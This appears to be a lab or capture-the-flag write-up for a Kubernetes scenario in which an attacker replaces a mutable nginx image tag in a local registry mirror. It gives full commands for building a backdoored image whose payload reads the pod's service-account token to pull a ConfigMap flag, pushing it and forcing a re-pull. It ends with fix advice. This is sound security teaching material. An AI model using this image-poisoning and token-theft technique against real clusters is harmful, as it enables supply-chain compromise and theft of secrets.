# K8S-15: Mutable Image Tag Supply Chain

## 场景信息

| 字段 | 值 |
|---|---|
| ID | K8S-15 |
| 名称 | Mutable Image Tag Supply Chain |
| 技术/CVE | N/A (image tag mutation) |
| 难度 | L2 |
| 交付方式 | KIND / Kubernetes |
| 入口 | localhost:10501 |

## 场景概述
- 技术：N/A (image tag mutation) -- 可变 tag + Always 拉取 + 镜像仓库镜像配置
- 难度：L2
- 交付方式：k8s

## 攻击路径与利用步骤

## Overview
| Property | Value |
|----------|-------|
| CVE/Technique | N/A -- mutable image tag with imagePullPolicy: Always |
| Difficulty | L2 |
| Type | k8s (KIND cluster) |
| Cluster Name | cve-k8s-15-image-tag |
| Registry | localhost:10501 (no TLS, on the kind network as `registry`) |
| Flag Location | ConfigMap `app-config` in namespace `default` |

## Attack Path Summary
1. A Deployment uses `image: nginx:1.24-alpine` with `imagePullPolicy: Always`
2. The cluster's containerd mirrors `docker.io` pulls to a local registry (`http://registry:5000`) published on host port 10501
3. The attacker pushes a malicious image to the registry under the mirrored path `library/nginx:1.24-alpine`
4. Deleting the pod forces a re-pull; the Deployment runs the attacker's image
5. The backdoored payload uses the pod SA token to read ConfigMap `app-config` and writes the flag to `/tmp/flag_found.txt`

## Prerequisites
- kubectl access to KIND cluster `cve-k8s-15-image-tag`
- Docker CLI with access to the host Docker daemon
- Network access to `localhost:10501`

## Step-by-Step Exploitation

### Step 1: Verify the Setup
```bash
curl -s http://localhost:10501/v2/
# Expected: {}

kubectl get deploy vulnerable-app
# Expected: image nginx:1.24-alpine, imagePullPolicy Always

kubectl get configmap app-config
# The flag lives ONLY in this ConfigMap (not in any pod env)
```

### Step 2: Build a Backdoored Image
```bash
mkdir -p /tmp/supply-chain
cat > /tmp/supply-chain/Dockerfile << 'EOF'
FROM alpine:latest
RUN apk add --no-cache curl
COPY payload.sh /payload.sh
RUN chmod +x /payload.sh
CMD ["/payload.sh"]
EOF

cat > /tmp/supply-chain/payload.sh << 'PAYLOAD'
#!/bin/sh
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
CA=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
curl -s --cacert "$CA" -H "Authorization: Bearer $TOKEN" \
  https://kubernetes.default.svc/api/v1/namespaces/default/configmaps/app-config \
  | grep -o '"flag":"[^"]*"' | cut -d'"' -f4 > /tmp/flag_found.txt
sleep 3600
PAYLOAD

docker build -t localhost:10501/library/nginx:1.24-alpine /tmp/supply-chain/
```

### Step 3: Push to the Mirrored Registry
```bash
docker push localhost:10501/library/nginx:1.24-alpine
curl -s http://localhost:10501/v2/library/nginx/tags/list
# Expected: {"name":"library/nginx","tags":["1.24-alpine"]}
```

> 注意：containerd 的 mirror 会把 `nginx:1.24-alpine`（即 `docker.io/library/nginx`）
> 重写到 `http://registry:5000/v2/library/nginx`，所以必须推送到 `library/nginx`
> 路径，而不是裸 `nginx`。

### Step 4: Trigger Re-pull
```bash
kubectl delete pod -l app=vulnerable-app
# Deployment recreates the pod with imagePullPolicy: Always -> pulls the poisoned image
kubectl get pods -l app=vulnerable-app -w
```

### Step 5: Read the Flag
```bash
NEW_POD=$(kubectl get pods -l app=vulnerable-app -o jsonpath='{.items[0].metadata.name}')
kubectl exec "$NEW_POD" -- cat /tmp/flag_found.txt
# Expected: flag{k8s-15-*}
```

## Flag Location
- ConfigMap `app-config` in namespace `default` (readable by the workload SA via the
  pre-configured `configmap-reader` RoleBinding)
- Flag format: `flag{k8s-15-*}`

## Verification
```bash
cd cve_challenges/scenarios/k8s/mutable-image-tag && bash deploy.sh
kubectl get configmap app-config -o jsonpath='{.data.flag}'
bash teardown.sh
```

## 此场景利用了哪些知识

| 规划维度 | 所需知识 |
|---|---|
| 环境与访问 | Container image tags, registries, and deployment rollouts |
| 侦察与前置条件 | Mutable tag use, image digest/registry provenance, containerd mirror behavior |
| 核心漏洞与利用 | Replace an image behind a trusted mutable tag |
| 权限、横向或影响 | Supply-chain code execution in a workload |
| 验证 | Verify the substituted workload exposes the flag |

## 修复建议
使用不可变镜像 digest（`image@sha256:...`）并禁止 `latest`/可变 tag；镜像仓库启用
写权限控制与推送审计；为 registry mirror 配置只读代理；生产环境用镜像签名
（cosign/notation）与准入校验（Kyverno/Gatekeeper）。
